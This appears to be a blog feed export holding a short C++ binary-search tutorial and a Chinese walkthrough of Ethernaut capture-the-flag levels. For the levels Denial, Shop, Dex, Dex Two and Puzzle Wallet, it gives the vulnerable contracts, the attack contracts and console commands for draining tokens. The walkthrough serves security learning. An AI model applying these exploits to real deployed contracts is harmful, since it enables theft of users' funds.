<h2 id="左开右闭"><a href="#左开右闭" class="headerlink" title="左开右闭"></a>左开右闭</h2><p>假如我们要转换为<strong>满足条件的最小值</strong>，即我们将条件转为“<strong>大于等于target</strong>”，即<code>[left+1,right]</code>中的元素都满足条件，但是<code>left</code>不满足，则更新代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"> <span class="keyword">int</span> TARGET = <span class="number">1024</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MIN = <span class="number">1</span>, MAX = <span class="number">999999</span>;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(<span class="keyword">int</span> check_num)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(check_num &gt;= TARGET)<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bin</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> left = MIN, right = MAX;</span><br><span class="line">	<span class="keyword">while</span> (left + <span class="number">1</span> &lt; right)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid = (left + right) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (check(mid))&#123;</span><br><span class="line">            right = mid;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            left = mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> right;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>更新区间边界逻辑：如果<code>check(mid)</code>返回值是真，则<code>[mid,right]</code>中的所有元素也一定能够满足“大于等于target”条件，但是满足条件的最小值应该在<code>[left,mid]</code>中，不可能在<code>[mid + 1,right]</code>中，因此<code>right = mid</code>；反之，如果其返回值是假，则说明满足条件的最大值不可能在<code>[left,mid]</code>中，因此<code>left= mid</code>；<strong>注意，我们新的区间仍然要满足开区间的定义！即左边节点不满足条件</strong></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>二分法是个很好用的工具，但是依据不同情况，可以有不同的实现方法，相比之下，左闭右闭的方法通用性比较大。</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>二分查找</tag>
      </tags>
  </entry>
  <entry>
    <title>【Ethernaut闯关录】下篇</title>
    <url>/2023/03/31/%E3%80%90Ethernaut%E9%97%AF%E5%85%B3%E5%BD%95%E3%80%91%E4%B8%8B%E7%AF%87/</url>
    <content><![CDATA[<p>原文再续，书接上回，本文继续闯关，本次我们来完成剩余所有关卡。<a id="more"></a></p>
<h2 id="Denial"><a href="#Denial" class="headerlink" title="Denial"></a>Denial</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">contract Denial &#123;</span><br><span class="line"></span><br><span class="line">    address public partner; &#x2F;&#x2F; withdrawal partner - pay the gas, split the withdraw</span><br><span class="line">    address public constant owner &#x3D; address(0xA9E);</span><br><span class="line">    uint timeLastWithdrawn;</span><br><span class="line">    mapping(address &#x3D;&gt; uint) withdrawPartnerBalances; &#x2F;&#x2F; keep track of partners balances</span><br><span class="line"></span><br><span class="line">    function setWithdrawPartner(address _partner) public &#123;</span><br><span class="line">        partner &#x3D; _partner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; withdraw 1% to recipient and 1% to owner</span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        uint amountToSend &#x3D; address(this).balance &#x2F; 100;</span><br><span class="line">        &#x2F;&#x2F; perform a call without checking return</span><br><span class="line">        &#x2F;&#x2F; The recipient can revert, the owner will still get their share</span><br><span class="line">        partner.call&#123;value:amountToSend&#125;(&quot;&quot;);</span><br><span class="line">        payable(owner).transfer(amountToSend);</span><br><span class="line">        &#x2F;&#x2F; keep track of last withdrawal time</span><br><span class="line">        timeLastWithdrawn &#x3D; block.timestamp;</span><br><span class="line">        withdrawPartnerBalances[partner] +&#x3D;  amountToSend;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; allow deposit of funds</span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; convenience function</span><br><span class="line">    function contractBalance() public view returns (uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：阻止合约所有者通关调用<code>withdraw()</code>函数取回资金。</p>
<p>要想阻止其转账，貌似只有从<code>call</code>和<code>transfer</code>处入手，但是对于<code>owner</code>变量和<code>amountToSend</code>我们无法控制，因此我们只能从<code>call</code>入手，该函数调用的地址<code>partner</code>是我们可以控制的，因此我们可以尝试利用该外部调用，触发一个<code>revert</code>操作。我原本想部署一个合约，然后在<code>fallback</code>函数中<code>revert</code>的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fallback()external&#123;</span><br><span class="line">        revert(&#39;&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不过最终没有通关，网上找了一个</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract attack &#123;</span><br><span class="line"></span><br><span class="line">    address public target;</span><br><span class="line"></span><br><span class="line">    constructor(address _addr) public payable &#123;</span><br><span class="line">        target&#x3D;_addr;</span><br><span class="line">        target.call(abi.encodeWithSignature(&quot;setWithdrawPartner(address)&quot;, address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        assert(false);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>依旧没有通关！</strong></p>
<h2 id="Shop"><a href="#Shop" class="headerlink" title="Shop"></a>Shop</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Buyer &#123;</span><br><span class="line">  function price() external view returns (uint);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Shop &#123;</span><br><span class="line">  uint public price &#x3D; 100;</span><br><span class="line">  bool public isSold;</span><br><span class="line"></span><br><span class="line">  function buy() public &#123;</span><br><span class="line">    Buyer _buyer &#x3D; Buyer(msg.sender);</span><br><span class="line"></span><br><span class="line">    if (_buyer.price() &gt;&#x3D; price &amp;&amp; !isSold) &#123;</span><br><span class="line">      isSold &#x3D; true;</span><br><span class="line">      price &#x3D; _buyer.price();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：将<code>isSold</code>变量设置为<code>true</code>同时将<code>price</code>减小。</p>
<p>本关卡实际上和关卡【Elevator】的解法差不多的。但是不同之处是这里的<code>price</code>是用<code>view</code>进行修饰。</p>
<blockquote>
<p>view修饰的函数，只读取状态，但不修改状态</p>
<p>pure修饰的函数，既不读取也不修改状态。</p>
<p>这里的修改状态，是指：修改状态变量、触发事件、创建合约、使用<code>selfdestruct</code>、通过<code>call</code>发送以太币、使用<code>call</code>调用任何没有被标记为<code>view</code>或者<code>pure</code>的函数、使用低级<code>call</code>、使用包含opcode的内联汇编。</p>
</blockquote>
<p>在关卡【Elevator】中，我们通过在合约中设置一个变量来区分是第几次调用，而本关卡已经无法继续使用该方法了，因为我们将来实现的<code>price()</code>函数将不能够修改状态变量。</p>
<p>但是仔细想想，我们虽然不能通过本地合约中的变量来区分是第几次调用，但是不妨碍我们访问外部合约中的变量来确定啊，实际上我们可以通过判断<code>Shop</code>合约中的<code>isSold</code>变量来判断这是第几次调用，不过得使用<code>staticcall</code>，该函数不会改变状态：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract Buyer &#123;</span><br><span class="line">    address public instance;</span><br><span class="line">    constructor(address _instance)&#123;</span><br><span class="line">    	instance &#x3D; _instance;</span><br><span class="line">    &#125;</span><br><span class="line">    function attack()public&#123;</span><br><span class="line">    	 (bool success, bytes memory returnedData) &#x3D; instance.call&#123;gas:100000&#125;(</span><br><span class="line">    	 	abi.encodeWithSignature(&quot;buy()&quot;)</span><br><span class="line">    	 );</span><br><span class="line">		 require(success);</span><br><span class="line">    &#125;</span><br><span class="line">    function price() external view returns (uint)&#123;</span><br><span class="line">  		(bool success, bytes memory returnedData) &#x3D; instance.staticcall(</span><br><span class="line">    		abi.encodeWithSignature(&quot;isSold()&quot;)</span><br><span class="line">    	);</span><br><span class="line">		require(success);</span><br><span class="line">    	bool isSold &#x3D; abi.decode(returnedData, (bool));</span><br><span class="line">        if(isSold)&#123;</span><br><span class="line">    		return 0;</span><br><span class="line">    	&#125;else&#123;</span><br><span class="line">    	return 100;</span><br><span class="line">    	&#125;</span><br><span class="line">  	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Dex"><a href="#Dex" class="headerlink" title="Dex"></a>Dex</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-08&#x2F;token&#x2F;ERC20&#x2F;IERC20.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-08&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol&quot;;</span><br><span class="line">import &#39;openzeppelin-contracts-08&#x2F;access&#x2F;Ownable.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract Dex is Ownable &#123;</span><br><span class="line">  address public token1;</span><br><span class="line">  address public token2;</span><br><span class="line">  constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function setTokens(address _token1, address _token2) public onlyOwner &#123;</span><br><span class="line">    token1 &#x3D; _token1;</span><br><span class="line">    token2 &#x3D; _token2;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function addLiquidity(address token_address, uint amount) public onlyOwner &#123;</span><br><span class="line">    IERC20(token_address).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function swap(address from, address to, uint amount) public &#123;</span><br><span class="line">    require((from &#x3D;&#x3D; token1 &amp;&amp; to &#x3D;&#x3D; token2) || (from &#x3D;&#x3D; token2 &amp;&amp; to &#x3D;&#x3D; token1), &quot;Invalid tokens&quot;);</span><br><span class="line">    require(IERC20(from).balanceOf(msg.sender) &gt;&#x3D; amount, &quot;Not enough to swap&quot;);</span><br><span class="line">    uint swapAmount &#x3D; getSwapPrice(from, to, amount);</span><br><span class="line">    IERC20(from).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">    IERC20(to).approve(address(this), swapAmount);</span><br><span class="line">    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getSwapPrice(address from, address to, uint amount) public view returns(uint)&#123;</span><br><span class="line">    return((amount * IERC20(to).balanceOf(address(this)))&#x2F;IERC20(from).balanceOf(address(this)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function approve(address spender, uint amount) public &#123;</span><br><span class="line">    SwappableToken(token1).approve(msg.sender, spender, amount);</span><br><span class="line">    SwappableToken(token2).approve(msg.sender, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address token, address account) public view returns (uint)&#123;</span><br><span class="line">    return IERC20(token).balanceOf(account);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SwappableToken is ERC20 &#123;</span><br><span class="line">  address private _dex;</span><br><span class="line">  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">        _dex &#x3D; dexInstance;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function approve(address owner, address spender, uint256 amount) public &#123;</span><br><span class="line">    require(owner !&#x3D; _dex, &quot;InvalidApprover&quot;);</span><br><span class="line">    super._approve(owner, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：盗走合约中的两个代币之一即可。</p>
<p>该合约中的函数<code>swap()</code>主要是实现给其他用户进行交换代币，然后通过<code>getSwapPrice</code>实现类似“汇率”的功能，即如果合约拥有的两种代币余额假若不同，则调用方需要支付的代币数目就会和得到的代币（当然这两种代币是不同的）数目不一样，问题就出在“汇率”的计算，因为该值等于合约拥有的两种代币余额的比值，假设两种代币中，合约拥有数量较少的代币为<code>A</code>，较多的是<code>B</code>，那么我们将<code>A</code>作为<code>from_token</code>，那么我就可以获得比<code>amont</code>还多的代币<code>B</code>（因为比值大于1），并保证调用<code>swap</code>后，合约拥有这两种代币的数量大小关系发生改变，接着我们就可以更换<code>from_token</code>，继续调用，直至最后达到合约拥有某个代币的数量为0，例如我们先用10个<code>token1</code>换取10个<code>token2</code>，，此时，合约和我们的各种代币余额如下：</p>
<table>
<thead>
<tr>
<th></th>
<th>token1</th>
<th>token2</th>
</tr>
</thead>
<tbody><tr>
<td>player</td>
<td>0</td>
<td>20</td>
</tr>
<tr>
<td>contract</td>
<td>110</td>
<td>90</td>
</tr>
</tbody></table>
<p>然后用20个<code>token2</code>换取<code>token1</code>，得到数量为$20*\frac{110}{90}$的<code>token1</code></p>
<table>
<thead>
<tr>
<th></th>
<th>token1</th>
<th>token2</th>
</tr>
</thead>
<tbody><tr>
<td>player</td>
<td>24</td>
<td>0</td>
</tr>
<tr>
<td>contract</td>
<td>86</td>
<td>110</td>
</tr>
</tbody></table>
<p>不断重复上述过程，不过在此之前要先授权：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.approve(instance, <span class="number">500</span>)</span><br></pre></td></tr></table></figure>

<p>然后按照上面的逻辑，不断交换两种<code>token</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.swap(<span class="string">'0x0ED5115953919866C5ED60f1fb44baBC356B5132'</span>, <span class="string">'0xc5e8b6e202a68a9C08BcF776138831D10A587714'</span>, <span class="number">10</span>)</span><br><span class="line"><span class="keyword">await</span> contract.swap(<span class="string">'0xc5e8b6e202a68a9C08BcF776138831D10A587714'</span>, <span class="string">'0x0ED5115953919866C5ED60f1fb44baBC356B5132'</span>, <span class="number">20</span>)</span><br><span class="line"><span class="keyword">await</span> contract.swap(<span class="string">'0x0ED5115953919866C5ED60f1fb44baBC356B5132'</span>, <span class="string">'0xc5e8b6e202a68a9C08BcF776138831D10A587714'</span>, <span class="number">24</span>)</span><br><span class="line"><span class="keyword">await</span> contract.swap(<span class="string">'0xc5e8b6e202a68a9C08BcF776138831D10A587714'</span>, <span class="string">'0x0ED5115953919866C5ED60f1fb44baBC356B5132'</span>, <span class="number">30</span>)</span><br><span class="line"><span class="keyword">await</span> contract.swap(<span class="string">'0x0ED5115953919866C5ED60f1fb44baBC356B5132'</span>, <span class="string">'0xc5e8b6e202a68a9C08BcF776138831D10A587714'</span>, <span class="number">41</span>)</span><br><span class="line"><span class="keyword">await</span> contract.swap(<span class="string">'0xc5e8b6e202a68a9C08BcF776138831D10A587714'</span>, <span class="string">'0x0ED5115953919866C5ED60f1fb44baBC356B5132'</span>, <span class="number">45</span>)</span><br></pre></td></tr></table></figure>

<p>完成最后的命令后，双方<code>token</code>如下：</p>
<table>
<thead>
<tr>
<th></th>
<th>token1</th>
<th>token2</th>
</tr>
</thead>
<tbody><tr>
<td>player</td>
<td>110</td>
<td>20</td>
</tr>
<tr>
<td>contract</td>
<td>0</td>
<td>90</td>
</tr>
</tbody></table>
<p>至此，我们已经将合约的<code>token1</code>全部获取，达成通关条件！</p>
<h2 id="Dex-Two"><a href="#Dex-Two" class="headerlink" title="Dex Two"></a>Dex Two</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-08&#x2F;token&#x2F;ERC20&#x2F;IERC20.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-08&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol&quot;;</span><br><span class="line">import &#39;openzeppelin-contracts-08&#x2F;access&#x2F;Ownable.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract DexTwo is Ownable &#123;</span><br><span class="line">  address public token1;</span><br><span class="line">  address public token2;</span><br><span class="line">  constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function setTokens(address _token1, address _token2) public onlyOwner &#123;</span><br><span class="line">    token1 &#x3D; _token1;</span><br><span class="line">    token2 &#x3D; _token2;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function add_liquidity(address token_address, uint amount) public onlyOwner &#123;</span><br><span class="line">    IERC20(token_address).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function swap(address from, address to, uint amount) public &#123;</span><br><span class="line">    require(IERC20(from).balanceOf(msg.sender) &gt;&#x3D; amount, &quot;Not enough to swap&quot;);</span><br><span class="line">    uint swapAmount &#x3D; getSwapAmount(from, to, amount);</span><br><span class="line">    IERC20(from).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">    IERC20(to).approve(address(this), swapAmount);</span><br><span class="line">    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);</span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  function getSwapAmount(address from, address to, uint amount) public view returns(uint)&#123;</span><br><span class="line">    return((amount * IERC20(to).balanceOf(address(this)))&#x2F;IERC20(from).balanceOf(address(this)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function approve(address spender, uint amount) public &#123;</span><br><span class="line">    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);</span><br><span class="line">    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address token, address account) public view returns (uint)&#123;</span><br><span class="line">    return IERC20(token).balanceOf(account);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SwappableTokenTwo is ERC20 &#123;</span><br><span class="line">  address private _dex;</span><br><span class="line">  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">        _dex &#x3D; dexInstance;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function approve(address owner, address spender, uint256 amount) public &#123;</span><br><span class="line">    require(owner !&#x3D; _dex, &quot;InvalidApprover&quot;);</span><br><span class="line">    super._approve(owner, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件：</strong>盗走合约中的两个代币。</p>
<p>这一关卡和上一关类似，只不过<code>swap</code>函数中，去掉了代币种类限制。也就是说，我们可以通关部署我们自己的代币，然后给我们player和合约<code>DexTwo</code>一定数量的代币，然后用新的代币换<code>token1</code>或者<code>token2</code>，即可实现：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;https:&#x2F;&#x2F;github.com&#x2F;OpenZeppelin&#x2F;openzeppelin-contracts&#x2F;blob&#x2F;master&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract AttackToken1 is ERC20 &#123;</span><br><span class="line">    constructor(address _player, address _instance) ERC20(&#39;AttackToken1&#39;, &#39;T1&#39;)&#123;</span><br><span class="line">        &#x2F;&#x2F; 我们分别给我们自己，以及合约 DexTwo 各一个token</span><br><span class="line">        &#x2F;&#x2F; 然后我们我们使用数量为 1 的该代币，即可换取其100个 token1</span><br><span class="line">        &#x2F;&#x2F; 因为合约 DexTwo 拥有 token 100 个，拥有 AttackToken1 1 个，二者相差100倍</span><br><span class="line">        &#x2F;&#x2F; 我们就可以获取 1 * 100 &#x3D; 100 个token1了</span><br><span class="line">        _mint(_player, 1);</span><br><span class="line">        _mint(_instance, 1);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract AttackToken2 is ERC20 &#123;</span><br><span class="line">    constructor(address _player, address _instance) ERC20(&#39;AttackToken2&#39;, &#39;T2&#39;)&#123;</span><br><span class="line">       &#x2F;&#x2F; 同上</span><br><span class="line">       _mint(_player, 1);</span><br><span class="line">        _mint(_instance, 1);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从控制台获取<code>player</code>和<code>instance</code>地址后，部署上面两个合约，然后进行授权：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">await contract.approve(instance, 500)</span><br><span class="line">Attacktoken1.approve(instance_addr, 500)</span><br><span class="line">Attacktoken2.approve(instance_addr, 500)</span><br></pre></td></tr></table></figure>

<p>然后就是调用<code>swap</code>函数了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.swap(attacktoken1_addr,token1_addr, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">await</span> contract.swap(attacktoken2_addr,token2_addr, <span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h2 id="Puzzle-Wallet"><a href="#Puzzle-Wallet" class="headerlink" title="Puzzle Wallet"></a>Puzzle Wallet</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">pragma experimental ABIEncoderV2;</span><br><span class="line"></span><br><span class="line">import &quot;..&#x2F;helpers&#x2F;UpgradeableProxy-08.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract PuzzleProxy is UpgradeableProxy &#123;</span><br><span class="line">    address public pendingAdmin;</span><br><span class="line">    address public admin;</span><br><span class="line"></span><br><span class="line">    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) &#123;</span><br><span class="line">        admin &#x3D; _admin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyAdmin &#123;</span><br><span class="line">      require(msg.sender &#x3D;&#x3D; admin, &quot;Caller is not the admin&quot;);</span><br><span class="line">      _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function proposeNewAdmin(address _newAdmin) external &#123;</span><br><span class="line">        pendingAdmin &#x3D; _newAdmin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approveNewAdmin(address _expectedAdmin) external onlyAdmin &#123;</span><br><span class="line">        require(pendingAdmin &#x3D;&#x3D; _expectedAdmin, &quot;Expected new admin by the current admin is not the pending admin&quot;);</span><br><span class="line">        admin &#x3D; pendingAdmin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function upgradeTo(address _newImplementation) external onlyAdmin &#123;</span><br><span class="line">        _upgradeTo(_newImplementation);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract PuzzleWallet &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 public maxBalance;</span><br><span class="line">    mapping(address &#x3D;&gt; bool) public whitelisted;</span><br><span class="line">    mapping(address &#x3D;&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function init(uint256 _maxBalance) public &#123;</span><br><span class="line">        require(maxBalance &#x3D;&#x3D; 0, &quot;Already initialized&quot;);</span><br><span class="line">        maxBalance &#x3D; _maxBalance;</span><br><span class="line">        owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyWhitelisted &#123;</span><br><span class="line">        require(whitelisted[msg.sender], &quot;Not whitelisted&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted &#123;</span><br><span class="line">      require(address(this).balance &#x3D;&#x3D; 0, &quot;Contract balance is not 0&quot;);</span><br><span class="line">      maxBalance &#x3D; _maxBalance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function addToWhitelist(address addr) external &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner, &quot;Not the owner&quot;);</span><br><span class="line">        whitelisted[addr] &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() external payable onlyWhitelisted &#123;</span><br><span class="line">      require(address(this).balance &lt;&#x3D; maxBalance, &quot;Max balance reached&quot;);</span><br><span class="line">      balances[msg.sender] +&#x3D; msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;&#x3D; value, &quot;Insufficient balance&quot;);</span><br><span class="line">        balances[msg.sender] -&#x3D; value;</span><br><span class="line">        (bool success, ) &#x3D; to.call&#123; value: value &#125;(data);</span><br><span class="line">        require(success, &quot;Execution failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function multicall(bytes[] calldata data) external payable onlyWhitelisted &#123;</span><br><span class="line">        bool depositCalled &#x3D; false;</span><br><span class="line">        for (uint256 i &#x3D; 0; i &lt; data.length; i++) &#123;</span><br><span class="line">            bytes memory _data &#x3D; data[i];</span><br><span class="line">            bytes4 selector;</span><br><span class="line">            assembly &#123;</span><br><span class="line">                selector :&#x3D; mload(add(_data, 32))</span><br><span class="line">            &#125;</span><br><span class="line">            if (selector &#x3D;&#x3D; this.deposit.selector) &#123;</span><br><span class="line">                require(!depositCalled, &quot;Deposit can only be called once&quot;);</span><br><span class="line">                &#x2F;&#x2F; Protect against reusing msg.value</span><br><span class="line">                depositCalled &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">            (bool success, ) &#x3D; address(this).delegatecall(data[i]);</span><br><span class="line">            require(success, &quot;Error while delegating call&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> <strong>通关条件：</strong>劫持钱包，成为代理的管理员</p>
<blockquote>
<p>本关卡参考自<a href="https://xz.aliyun.com/t/11159#toc-15" target="_blank" rel="noopener">【https://xz.aliyun.com/t/11159#toc-15】</a></p>
</blockquote>
<p>本关卡涉及代理，我们先来说一下代理模式，这是一种常见的设计模式，提供通过代理的方式访问真正的实例，生活中经理和秘书的关系实际上就是一种代理模式，我们要和经理打交道，先通过和秘书预约，秘书会转发消息到经理，经理的决策反馈到秘书，最终秘书会告知我们结果。</p>
<p>在程序设计中，如果我们要访问模块A，我们可以通过访问代理B，在代理B中，有模块A的对象实例，并且二者的接口几乎一致，使得我们调用B的时候，我们以为我们在调用A。</p>
<p>代理模式优点是：实现热部署，即如果我们业务逻辑要更新，我们只要在代理中切换实例对象即可，使用者并不知道服务有中断。</p>
<p>在智能合约中，该模式还有利于解决区块链中“<strong>一旦上链，就无法更新代码</strong>”的问题，我们可以部署一个代理合约，然后给管理员暴露一个切换真实实例的接口（函数），然后将<strong>转发功能</strong>在<code>fallback</code>函数中执行。</p>
<p>获取本道题的实例后，得到一个地址，<code>0xb042791D96306B9A1e7dD3B8f3e7734af2B37C8f</code>,然后在控制台输入：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.methods</span><br></pre></td></tr></table></figure>

<p>我们可以看到，都是<code>PuzzleWallet</code>中的函数，可是实际上这个地址真的是合约<code>PuzzleWallet</code>的实例地址吗？实际上并不是，我们在<code>Ethernaut</code>的github项目中找到<a href="https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/contracts/levels/PuzzleWalletFactory.sol" target="_blank" rel="noopener">【工厂合约】</a>，在</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &#39;.&#x2F;base&#x2F;Level.sol&#39;;</span><br><span class="line">import &#39;.&#x2F;PuzzleWallet.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract PuzzleWalletFactory is Level &#123;</span><br><span class="line"></span><br><span class="line">  function createInstance(address &#x2F;*_player*&#x2F;) override public payable returns (address) &#123;</span><br><span class="line">    require(msg.value &#x3D;&#x3D;  0.001 ether, &quot;Must send 0.001 ETH to create instance&quot;);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; deploy the PuzzleWallet logic</span><br><span class="line">    PuzzleWallet walletLogic &#x3D; new PuzzleWallet();</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; deploy proxy and initialize implementation contract</span><br><span class="line">    bytes memory data &#x3D; abi.encodeWithSelector(PuzzleWallet.init.selector, 100 ether);</span><br><span class="line">    PuzzleProxy proxy &#x3D; new PuzzleProxy(address(this), 